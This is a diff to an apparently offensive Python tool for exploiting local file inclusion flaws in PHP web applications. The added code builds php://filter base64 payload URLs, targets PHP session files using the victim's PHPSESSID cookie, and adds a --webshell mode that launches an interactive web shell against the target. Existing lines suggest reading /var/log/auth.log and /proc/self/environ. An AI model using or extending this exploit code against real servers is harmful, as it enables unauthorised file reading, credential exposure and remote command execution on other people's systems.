@@ -179,8 +179,13 @@ class Local_File_In:
                     LINE.replace('\n','')
                     self.LFi = ''
                     if self.args.base64:
-                        phpfillter = 'php://filter/read=convert.base64-encode/resource='
-                        URL = self.args.Vulnurl.split("=")[0]+"="+ phpfillter+LINE
+                        if 'sess_' not in LINE :
+                            phpfillter = 'php://filter/read=convert.base64-encode/resource='
+                            URL = self.args.Vulnurl.split("=")[0]+"="+ phpfillter+LINE
+                        else:
+                            URL = self.args.Vulnurl.split("=")[0]+"="+ phpfillter+LINE.replace('\n','')+str("".join(re.findall(r"PHPSESSID=([a-z0-9]+)",self.Cookie)))
+                    elif 'sess_' in LINE:
+                        URL = self.args.Vulnurl+LINE+str("".join(re.findall(r"PHPSESSID=([a-z0-9]+)",self.Cookie)))    
                     else:
                          URL = self.args.Vulnurl+LINE
                                                                                                           
@@ -285,7 +290,12 @@ class Local_File_In:
                                       print("[*] Example : --read /var/log/auth.log ")
                                       print("[*] Example : --read /proc/self/environ")
                                       print("[*] Example : --read /var/log/auth")
-                                      exit()       
+                                      exit()   
+                        elif self.args.webshell:
+                            with open('./Package/shell/.FileWebInfo.txt',"a") as dataurl:
+                                dataurl = dataurl.write("self.url ="+self.url)
+                            from Package.webshell import WebShellInteract
+                            WebShellInteract.WebShell(self,**kwargs) 
                         else:
                              exit()                 
                     elif not self.args.auth and len(self.Get_Oregnal_URL) > len(self._first_req) :
@@ -335,6 +345,12 @@ class Local_File_In:
                                       print("[*] Example : --read /proc/self/environ")
                                       print("[*] Example : --read /var/log/auth")
                                       exit()
+                        elif self.args.webshell:
+                            with open('./Package/shell/.FileWebInfo.txt',"a") as dataurl:
+                                dataurl = dataurl.write("self.url ="+self.url)
+                            from Package.webshell import WebShellInteract
+                            WebShellInteract.WebShell(self,**kwargs) 
+                            exit()                        
                         else:
                               exit()                             
                 print('\n'+'='*20+"\n[*] RESUITE-INFO "+'\n'+'='*30+'\n')
